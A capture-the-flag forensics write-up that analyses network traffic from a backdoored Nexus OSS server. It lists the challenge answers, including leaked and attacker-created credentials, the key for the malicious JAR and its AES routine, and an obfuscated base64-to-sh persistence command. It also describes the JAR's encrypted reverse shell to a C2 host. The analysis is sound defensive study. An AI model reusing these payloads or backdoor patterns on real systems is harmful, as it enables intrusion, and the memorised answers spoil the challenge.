# Synopsis

- The Nexus Breach is a medium level forensics challenge that requires analyzing a PCAP file containing network traffic related to an attack that targets a Nexus OSS instance.
    
    The goal is to dissect the traffic, identify activities and piece together the sequence of events by answering a series of questions in order to get the flag.
    

## Description

- In an era fraught with cyber threats, Talion "Byte Doctor" Reyes, a former digital forensics examiner for an international crime lab, has uncovered evidence of a breach targeting critical systems vital to national infrastructure. Subtle traces of malicious activity point to a covert operation orchestrated by the Empire of Volnaya, a nation notorious for its expertise in cyber sabotage and hybrid warfare tactics.
    
    The breach threatens to disrupt essential services that Task Force Phoenix relies on in its ongoing fight against the expansion of the Empire of Volnaya. The attackers have exploited vulnerabilities in interconnected systems, employing sophisticated techniques to evade detection and trigger widespread disruption
    
    Can you analyze the digital remnants left behind, reconstruct the attack timeline, and uncover the full extent of the threat?
    

## Skills Required

- Familiarity with analyzing network traffic
- Analyzing and understanding logic behind Java/Bash obfuscated code
- Analyzing and detecting custom attacks

## Skills Learned

- Reversing and analyzing obfuscated Java/Bash code
- Analyzing events and reconstructing the context attack
- Analyzing and detecting custom persistence techniques

# Solves
## Which credentials has been used to login on the platform? (e.g. username:password)

Found in the put request of the malicious payload being uploaded.
`admin:dL4zyVJ1y8UhT1hX1m`


## Which Nexus OSS version is in use? (e.g. 1.10.0-01)

The version is in the same HTTP stream `2.15.1-02`


## The attacker created a new user for persistence. Which credentials has been set? (e.g. username:password)

In the same HTTP Stream
```
{"data": {"userId": "adm1n1str4t0r", "firstName": "Persistent", "lastName": "Admin", "email": "adm1n1str4t0r@phoenix.htb", "status": "active", "roles": ["nx-admin"], "password": "46vaGuj566"}}
```
`adm1n1str4t0r:46vaGuj566`



## One core library written in Java has been tampered and replaced by a malicious one. Which is its package name? (e.g. com.company.name)

![](Images/Pasted%20image%2020250526104325.png)
`com.phoenix.toolkit`


## The tampered library contains encrypted communication logic. What is the secret key used for session encryption? (e.g. Secret123)

I need to get the malicious java-archive.
```
http.content_type == "application/java-archive"
```

Copy the media from hex and convert to a zip file.
![](Images/Pasted%20image%2020250526105651.png)

Now we should be able to extract it.
![](Images/Pasted%20image%2020250526105736.png)

We will have to decompile the app.class with something like www.decompiler.com to make it readable.

```
private static final String pKzLq7 = Base64.getEncoder().encodeToString(xYzWq8("3t9834".getBytes(), 55));
private static final String wYrNb2 = Base64.getEncoder().encodeToString(xYzWq8("s3cr".getBytes(), 77));
private static final String xVmRq1 = Base64.getEncoder().encodeToString(xYzWq8("354r".getBytes(), 23));
private static final String aDsZx9 = Base64.getEncoder().encodeToString(xYzWq8("34".getBytes(), 42));
private static final int[] nQoMf6 = new int[]{3, 2, 1, 0};
```

Generates the private key. We can simulate this to get the private key.

```
pKzLq7 = BEMODwQD
wYrNb2 = Pn4uPw==
xVmRq1 = JCIjZQ==
aDsZx9 = GR4=

Decoded parts before reorder:
['3t9834', 's3cr', '354r', '34']

Combined reordered string:

34354rs3cr3t9834

Secret key after gDF5a transformation:
vuvtuYXvHYvW"#vu
```

`vuvtuYXvHYvW"#vu`
## Which is the name of the function that manages the (AES) string decryption process? (e.g. aVf41)


```
private static String uJtXq5(String kVzNy4, String pWlXq7) throws Exception {
    SecretKeySpec bFyMp6 = new SecretKeySpec(pWlXq7.getBytes(StandardCharsets.UTF_8), "AES");
    Cipher tZrXq9 = Cipher.getInstance("AES");
    tZrXq9.init(2, bFyMp6); // 2 = Cipher.DECRYPT_MODE
    return new String(tZrXq9.doFinal(Base64.getDecoder().decode(kVzNy4)));
}
```

`uJtXq5`


The script basically does the following:
- The Java app connects to a C2 server (`10.10.10.23` port `4444`).
- It reads encrypted commands from the C2 over a socket.
- It **decrypts** commands using AES with the session key derived from that obfuscated key construction.
- It runs those decrypted commands **on the local system shell** via `Runtime.exec()`.
- It captures the command output.
- It **encrypts the output** using the same AES key and sends it back to the C2.
- This continues in a loop until it receives the `"exit"` command.


## Which is the system command that triggered the reverse shell execution for this session running the tampered JAR? (e.g. "java .... &")

After the uploaded files the following commands were ran

![](Images/Pasted%20image%2020250526115056.png)



We can now filter on traffic going to the C2 by doing `ip.addr == 10.10.10.23 && tcp.port == 4444` and decrypt the entire communication

![](Images/Pasted%20image%2020250526112308.png)


## Which other legit user has admin permissions on the Nexus instance (excluding "adm1n1str4t0r" and "admin")? (e.g. john_doe)

![](Images/Pasted%20image%2020250526112406.png)

`john_smith`


## The attacker wrote something in a specific file to maintain persistence, which is the full path? (e.g. /path/file)

I believe we have to look into 

```
"Z0g0PSJFZCI7a00wPSJ4U3oiO2M9ImNoIjtMPSI0IjtyUVc9IiI7ZkUxPSJsUSI7cz0iICc9b2djbFJYWWtCWGR0Z1hhdVYyYm9Cbkx2VTJaaEozYjBOM0xySjNiMzFTWndsSGRoNTJiejlDSTR0Q0lrOVdib05HSW1ZQ0l5VkdkaFJHYzExQ2VwNVdadmhHY3U4U1puRm1jdlIzY3ZzbWN2ZFhMbEJYZTBGbWJ2TjNMZzRESWlFakorQURJMFFETjA4eU15NENNeDRDTXg0Q014OENjalIzTDJWR1p2QWlKK0FTYXRBQ2F6Rm1ZaUF5Ym9OV1oKJyB8IHIiO0h4Sj0icyI7SGMyPSIiO2Y9ImFzIjtrY0U9InBhcyI7Y0VmPSJhZSI7ZD0ibyI7Vjl6PSI2IjtQOGM9ImlmIjtVPSIgLWQiO0pjPSJlZiI7TjBxPSIiO3Y9ImIiO3c9ImUiO2I9InYgfCI7VHg9IkVkcyI7eFpwPSIiCng9JChldmFsICIkSGMyJHckYyRyUVckZCRzJHckYiRIYzIkdiR4WnAkZiR3JFY5eiRyUVckTCRVJHhacCIpCmV2YWwgIiROMHEkeCRIYzIkclFXIgo=" | base64 --decode | sh
```

Decoding that gets us 
```
gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ ' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp="" x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp") eval "$N0q$x$Hc2$rQW"
```

We are given a bunch of variables that we can match to reconstruct the command.
```
echo '=ogclRXYkBXdtgXauV2boBnLvU2ZhJ3b0N3LrJ3b31SZwlHdh52bz9CI4tCIk9WboNGImYCIyVGdhRGc11Cep5WZvhGcu8SZnFmcvR3cvsmcvdXLlBXe0FmbvN3Lg4DIiEjJ+ADI0QDN08yMy4CMx4CMx4CMx8CcjR3L2VGZvAiJ+ASatACazFmYiAyboNWZ' | rev | base64 -d
```

It stored the base64 in reverse for further obfuscation. The reversed would be
```
ZWNob2lAeSAtSEA+AiJvGZ2VGLrJ3czACA1Qzd0QDI0ADJ+jEI4gDL3Nf0eXllXdvcsmvc3RvcmfnZ5cu8GhvZpEc11GdhRGYvI2YGImboNW9k4C9Tz5hd1lHdwZ31SzhJnb0N3LnU2boBnV2uaXdgtgXd1BXkYRXzlgo=
```

![](Images/Pasted%20image%2020250526113701.png)

```
/sonatype-work/storage/.phoenix-updater
```

## Which is the first executed command in the encrypted reverse shell session? (e.g. whoami)


![](Images/Pasted%20image%2020250526120920.png)

`uname -a`